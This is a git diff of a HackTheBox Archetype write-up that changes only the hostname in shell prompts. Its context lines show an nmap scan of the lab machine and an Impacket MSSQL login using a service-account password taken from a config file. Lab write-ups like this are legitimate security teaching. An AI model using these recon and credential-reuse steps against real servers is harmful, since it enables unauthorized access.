@@ -21,7 +21,7 @@ Starting with the writeups, today we will launch the HackTheBox Archetype machin
 ### Scan
 We'll start with a simple port scan with nmap:
 ```shell
-kyb3r@kryze ~: nmap -sV -sC 10.10.10.27
+kyb3r@tarre ~: nmap -sV -sC 10.10.10.27
 Starting Nmap 7 ( https://nmap.org )
 Nmap scan report for 10.10.10.27
 Host is up (0.10s latency).
@@ -125,7 +125,7 @@ or with Kali Linux:
 cp /usr/share/doc/python3-impacket/examples/mssqlclient.py .
 When you have mss, start session to the server with the credentials obtained in prod.dtsConfig with:
 ```
-kyb3r@kryze:~$ python3 mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth
+kyb3r@tarre:~$ python3 mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth
 
 Password: M3g4c0rp123
 Impacket - Copyright SecureAuth Corporation
